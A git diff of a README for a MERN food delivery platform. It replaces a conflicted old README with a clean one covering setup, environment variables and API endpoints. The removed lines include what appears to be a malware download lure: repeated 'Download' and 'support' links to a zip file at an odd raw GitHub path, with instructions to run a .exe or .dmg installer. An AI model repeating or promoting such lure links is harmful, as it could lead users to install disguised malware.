@@ -1,245 +1,269 @@
-<<<<<<< HEAD
+# 🍔 Food Delivery Platform (MERN)
 
+![Food Delivery Banner](assets/banner.png)
 
-# 🍔 Foodie Frenzy - Full Stack Food Delivery Platform
+A full-stack **food ordering platform** built with the **MERN stack**—featuring a customer-facing storefront, an admin dashboard, and a Node/Express API powered by MongoDB.
 
-![Project Banner](https://via.placeholder.com/1000x300?text=Foodie+Frenzy+Banner+Placeholder)
-
-> **A robust, full-stack food delivery application built with the MERN stack.** > Seamlessly connects users with their favorite meals through a responsive UI, secure payments, and real-time order tracking.
+🌐 **Live Demo:** https://syedishaq.me/Food-Delivery-Platform/  
+🧑‍💼 **Admin (Live):** https://syedishaq.me/Food-Delivery-Platform/admin
 
 ---
 
-## 🔗 Live Links
-- **Source Code:** [https://github.com/ishaq019/Food-Delivery-Platform-Foodie-Frenzy-](https://github.com/ishaq019/Food-Delivery-Platform-Foodie-Frenzy-)
+## 📚 Table of Contents
+
+- [✨ Overview](#-overview)
+- [🚀 Key Features](#-key-features)
+- [🧰 Tech Stack](#-tech-stack)
+- [🗂️ Project Structure](#️-project-structure)
+- [⚙️ Setup & Installation](#️-setup--installation)
+  - [✅ Prerequisites](#-prerequisites)
+  - [🔧 Backend Setup](#-backend-setup)
+  - [🎨 Frontend Setup](#-frontend-setup)
+  - [🧑‍💼 Admin Panel Setup](#-admin-panel-setup)
+- [🔐 Environment Variables](#-environment-variables)
+- [🔌 API Endpoints](#-api-endpoints)
+- [🧪 Usage](#-usage)
+- [🛠️ Troubleshooting](#️-troubleshooting)
+- [🤝 Contributing](#-contributing)
+- [📄 License](#-license)
+
+---
+
+## ✨ Overview
+
+This repository contains three main parts:
+
+- **Frontend** (Customer UI): browse menu, manage cart, place orders, view order history
+- **Admin Panel**: manage food items and track/update orders
+- **Backend API**: authentication, food CRUD (admin), cart management, orders and status updates
+
+> Note: The frontend/admin currently reference a deployed API URL directly inside the code (see [Configuration](#-usage)).
 
 ---
 
 ## 🚀 Key Features
 
-### User Panel
-- **Authentication:** Secure Login/Signup functionality using JWT.
-- **Browse & Search:** Filter food items by category or search by name.
-- **Cart Management:** Add/Remove items, adjust quantities, and view total cost dynamically.
-- **Secure Checkout:** Integrated **Stripe Payment Gateway** for secure transactions.
-- **Order History:** View past orders and current order status (Processing, Out for Delivery, etc.).
+### 👤 Customer (Frontend)
 
-### Admin Panel
-- **Dashboard:** Overview of total orders, revenue, and product statistics.
-- **Product Management:** Add, edit, or remove food items and update images.
-- **Order Management:** Update order status (Processing -> Delivered) to keep users informed.
+- 🔐 JWT-based authentication (register/login)
+- 🍽️ Browse and view food items
+- 🛒 Cart management (add/remove + totals)
+- 📦 Place orders with address details
+- 🧾 View your orders & status updates
 
----
+### 🧑‍💼 Admin Panel
 
-## 🛠️ Tech Stack
-
-| Component | Technology |
-| :--- | :--- |
-| **Frontend** | React.js, Context API, React Router, Tailwind CSS |
-| **Backend** | Node.js, Express.js |
-| **Database** | MongoDB, Mongoose |
-| **Authentication** | JWT (JSON Web Tokens), Bcrypt |
-| **Payments** | Stripe API |
-| **Assets** | FontAwesome, Google Fonts |
+- ➕ Add new food items (with image upload)
+- 🗑️ Remove food items
+- 📋 View all orders
+- 🔄 Update order status (admin-only)
 
 ---
 
-## ⚙️ Local Setup & Installation
+## 🧰 Tech Stack
 
-Follow these steps to run the project locally on your machine.
+- **Frontend / Admin:** React + Vite, React Router, Axios, React Toastify
+- **Backend:** Node.js, Express.js, JWT, Bcrypt, Multer
+- **Database:** MongoDB + Mongoose
+- **Assets:** Static image serving via `/images` (uploads folder)
 
-### Prerequisites
-- Node.js (v14 or higher)
-- MongoDB (Local or Atlas URI)
+---
 
-### 1. Clone the Repository
-```bash
-git clone [https://github.com/ishaq019/Food-Delivery-Platform-Foodie-Frenzy-](https://github.com/ishaq019/Food-Delivery-Platform-Foodie-Frenzy-)
-cd Food-Delivery-Platform-Foodie-Frenzy-
+## 🗂️ Project Structure
 
+```txt
+Food-Delivery-Platform/
+├── backend/                 # Node/Express API
+│   ├── config/              # DB config
+│   ├── controllers/         # Business logic
+│   ├── middleware/          # Auth middleware
+│   ├── models/              # Mongoose models
+│   ├── routes/              # API routes
+│   ├── uploads/             # Uploaded images (local)
+│   ├── .env.example         # Env template
+│   └── server.js            # Server entry
+├── frontend/                # Customer UI (React/Vite)
+└── admin/                   # Admin dashboard (React/Vite)
 ```
 
-### 2. Backend Setup
+---
 
-Navigate to the backend folder and install dependencies.
+## ⚙️ Setup & Installation
+
+### ✅ Prerequisites
+
+- Node.js (recommended: latest LTS)
+- MongoDB (local or Atlas)
+- Git
+
+---
+
+### 🔧 Backend Setup
 
 ```bash
 cd backend
 npm install
-
 ```
 
-**Create a `.env` file in the `backend` directory** and add the following variables:
-
-```env
-PORT=4000
-MONGO_URI=your_mongodb_connection_string
-JWT_SECRET=your_jwt_secret_key
-STRIPE_SECRET_KEY=your_stripe_secret_key
-
-```
-
-Start the backend server:
+1. Create a `.env` file inside `backend/` based on `.env.example`
+2. Start the server:
 
 ```bash
 npm run server
-
 ```
 
-### 3. Frontend Setup
+Backend runs on:  
+http://localhost:4000 (default)
 
-Open a new terminal, navigate to the frontend folder, and install dependencies.
+---
+
+### 🎨 Frontend Setup (Customer)
 
 ```bash
 cd frontend
 npm install
-
-```
-
-**Create a `.env` file in the `frontend` directory** (if required for Stripe public key):
-
-```env
-VITE_STRIPE_PUBLIC_KEY=your_stripe_publishable_key
-
-```
-
-Start the frontend application:
-
-```bash
 npm run dev
-
 ```
 
-The app should now be running at `http://localhost:5173` (or your specified port).
+Vite dev server typically runs on:  
+http://localhost:5173
 
 ---
 
-## 📂 Project Structure
+### 🧑‍💼 Admin Panel Setup
 
 ```bash
-Foodie-Frenzy/
-├── backend/            # Express & Node.js Server
-│   ├── config/         # DB Connection
-│   ├── controllers/    # Route Logic
-│   ├── models/         # Mongoose Models
-│   ├── routes/         # API Routes
-│   └── server.js       # Entry Point
-├── frontend/           # React Client
-│   ├── src/
-│   │   ├── assets/     # Images & Icons
-│   │   ├── components/ # Reusable Components
-│   │   ├── context/    # State Management
-│   │   └── pages/      # App Views
-│   └── main.jsx
-└── README.md
-
+cd admin
+npm install
+npm run dev
 ```
-=======
-# 🍔 food-delivery - Easy Way to Order Food Online
 
-[![Download Now](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip%20Now-Click%https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip)](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip)
+Vite dev server typically runs on:  
+http://localhost:5174 (or next available port)
 
-## 🥗 Overview
+---
 
-Tomato is the MERN Stack-powered food ordering website that makes online food shopping easy and secure. It includes user and admin panels, secure JWT Authentication, Stripe payments, and essential features like Login, Add to Cart, and Order Management. Enjoy a seamless food ordering experience with Tomato.
+## 🔐 Environment Variables
 
-## 🚀 Getting Started
+Backend variables (see `backend/.env.example`):
 
-Follow these simple steps to get started with Tomato.
+```env
+# MongoDB
+MONGO_URL=your_mongodb_connection_string
 
-1. **Visit the Releases Page**  
-   Go to the Releases page to find the latest version of Tomato. You can find it here: [Download Tomato](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip).
+# JWT
+JWT_SECRET=your_jwt_secret
+SALT=10
 
-2. **Download the Application**  
-   Look for the version you want to install. Click on the link for the file that matches your operating system. 
+# Payment keys (optional / future-ready)
+ROZAR_KEY=your_key_id
+ROZAR_SECRET_KEY=your_secret_key
 
-3. **Install Tomato**  
-   After downloading, locate the file on your computer and open it. Follow the installation prompts. 
+# Webhook (optional)
+WEBHOOK_URL=
+```
 
-4. **Run the Application**  
-   Once installed, find the Tomato application in your programs list or on your desktop. Click to open and start using Tomato.
+✅ Minimum required to run locally:
 
-## 💻 System Requirements
+- `MONGO_URL`
+- `JWT_SECRET`
+- `SALT`
 
-To ensure Tomato runs smoothly, please check that your computer meets these requirements:
+---
 
-- **Operating System:** Windows 10 or higher, macOS 10.12 or higher
-- **RAM:** At least 4 GB
-- **Storage:** At least 500 MB of free space
-- **Internet Connection:** Required for online ordering
+## 🔌 API Endpoints
 
-## ✨ Features
+Base URL (local): http://localhost:4000
 
-Tomato offers a variety of features to enhance your food ordering experience:
+### 👤 Auth
 
-- **User-Friendly Interface:** Easy navigation for ordering food.
-- **Secure Login:** Safely log in with JWT authentication.
-- **Add to Cart:** Save your favorite meals.
-- **Order Management:** Track your orders effortlessly.
-- **Stripe Payments:** Secure payment options for easy transactions.
+- POST `/api/user/register`
+- POST `/api/user/login`
 
-## 🛠️ Installation Instructions
+### 🍔 Food
 
-Now, let’s go through the installation process in more detail:
+- GET  `/api/food/list`
+- POST `/api/food/add` (admin, multipart image upload)
+- POST `/api/food/remove` (admin)
 
-1. **Download the Application**
-   - **Windows:** Download the `.exe` file.
-   - **macOS:** Download the `.dmg` file.
+### 🛒 Cart (auth required)
 
-   **Important:** Make sure to download from the official releases page: [Download Tomato](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip).
+- POST `/api/cart/add`
+- POST `/api/cart/remove`
+- POST `/api/cart/get`
 
-2. **Open the Downloaded File**
-   - For Windows: Double-click on the `.exe` file to start the installation.
-   - For macOS: Open the `.dmg` file and drag the Tomato icon into your Applications folder.
+### 📦 Orders
 
-3. **Complete the Installation**
-   - Follow the prompts that appear during installation. You may need to agree to some terms and conditions.
-   - Once finished, you will see a confirmation that the installation is complete.
+- POST `/api/order/place` (auth required)
+- POST `/api/order/verify`
+- POST `/api/order/userorders` (auth required)
+- GET  `/api/order/list` (admin)
+- POST `/api/order/status` (admin)
 
-4. **Launch Tomato**
-   - For Windows: Find Tomato in the Start Menu.
-   - For macOS: Open your Applications folder and click on Tomato.
+### 🖼️ Images
 
-## 🌐 Using Tomato
+- GET `/images/<filename>` (static serving from backend uploads)
 
-Once you have launched Tomato, you can start placing orders:
+---
 
-1. **Create an Account**  
-   Sign up for a new account or log in if you already have one.
+## 🧪 Usage
 
-2. **Browse the Menu**  
-   Explore all the delicious options available. You can filter by cuisine or dietary preference.
+### 🔁 Point the Frontend/Admin to Your Local Backend
 
-3. **Add Items to Your Cart**  
-   Click on the items you want and add them to your cart.
+In the current code, the API base URL is set directly in:
 
-4. **Checkout**  
-   Once you are ready, go to your cart and proceed to checkout. Select your payment method and enter your delivery details.
+- `frontend/src/context/StoreContext.jsx`
+- `admin/src/App.jsx` (and/or related admin components)
 
-5. **Track Your Order**  
-   After placing your order, you can track its status in the app.
+Update the base URL to your local backend:
 
-## 📬 Support
+```js
+const url = "http://localhost:4000";
+```
 
-If you have questions or need help using Tomato, there are several ways to get support:
+✅ Recommendation (best practice): replace hardcoded URLs with environment variables like `VITE_API_URL`.
 
-- **Documentation:** Refer to the official documentation included with your download.
-- **Community Forum:** Join our online forum to connect with other users and share tips.
-- **Contact Support:** Reach out via email at https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip for assistance.
+---
 
-## ⚙️ Contributing
+## 🛠️ Troubleshooting
 
-If you want to contribute to Tomato, please consider forking the repository on GitHub and submitting a pull request. We welcome improvements and feedback.
+### MongoDB connection fails
 
-## 🔗 Additional Resources
+- Verify `MONGO_URL` in `backend/.env`
+- Ensure IP is allowed (MongoDB Atlas) and credentials are correct
 
-For more information, check our documentation and tutorials. Explore the following guides:
+### Unauthorized errors
 
-- Setting Up Your Account
-- Making Secure Payments
-- Managing Your Orders
+- Ensure requests include token in headers
+- Re-login to refresh stored token
 
-Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/SkyARGamer/food-delivery/main/rayage/food-delivery.zip) for updates and new features.
+### Images not loading
 
-Happy ordering with Tomato!
->>>>>>> bd3db10 ( Complete Code)
-"# Food-Delivery-Platform" 
+- Confirm backend is running
+- Verify that `/images` endpoint is accessible
+- Ensure `backend/uploads/` exists when running locally
+
+### Admin actions blocked
+
+- Admin operations check user role on the server
+- Make sure your user has role: `"admin"` in the database
+
+---
+
+## 🤝 Contributing
+
+Contributions are welcome! ✨  
+If you’d like to improve the project:
+
+1. Fork the repo
+2. Create a new branch (`feature/your-feature`)
+3. Commit your changes
+4. Open a Pull Request
+
+---
+
+## 📄 License
+
+No license is currently specified in this repository.  
+If you plan to make it open-source friendly, consider adding a license (e.g., MIT, Apache-2.0).
+
